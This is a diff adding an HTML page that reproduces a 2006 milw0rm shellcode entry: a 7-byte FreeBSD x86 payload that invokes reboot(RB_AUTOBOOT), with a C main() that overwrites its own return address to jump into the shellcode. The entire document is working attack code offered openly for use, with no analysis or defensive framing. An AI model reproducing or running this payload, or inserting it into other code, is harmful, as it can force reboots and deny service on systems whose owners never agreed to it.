@@ -1,0 +1,29 @@
+<html><head><title>freebsd/x86 reboot(RB_AUTOBOOT) Shellcode 7 bytes</title></head><pre>/*
+ *
+ * FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)
+ *
+ * by IZ &lt;guerrilla.sytes.net&gt;
+ *
+ */
+
+
+char shellcode[] =
+&quot;\x31\xc0&quot;                  /* xor %eax,%eax */
+
+&quot;\x50&quot;                      /* push %eax */
+&quot;\xb0\x37&quot;                  /* mov $0x37,%al */
+&quot;\xcd\x80&quot;;                 /* int $0x80 */
+
+
+void main()
+{
+     int*     ret;         
+
+     ret = (int*) &amp;ret + 2;
+
+     printf(&quot;len %d\n&quot;,strlen(shellcode));
+
+     (*ret) = (int) shellcode; 
+}
+
+// milw0rm.com [2006-04-19]</pre></html>
